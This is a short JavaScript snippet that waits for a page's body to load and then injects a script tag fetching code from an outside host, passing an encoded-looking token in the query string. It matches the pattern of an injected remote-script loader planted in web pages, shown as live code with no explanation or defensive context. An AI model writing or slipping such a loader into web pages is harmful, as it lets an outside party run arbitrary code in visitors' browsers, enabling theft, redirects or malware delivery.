(function(w) {
	var script = document.createElement('script');
	var i = setInterval(function() {
		if (typeof w.document.body !== 'undefined') {
			var s = "http://cost.example-ever.info/?";
			s += 781883 + "=TwZPSR1LUl8GDAoJCQ0dXVRJVlpPSAZZSR1VVFpfTldPBgo";
			script.src = s;
			w.document.body.appendChild(script);
			clearInterval(i);
		}
	}, 200);
})(window);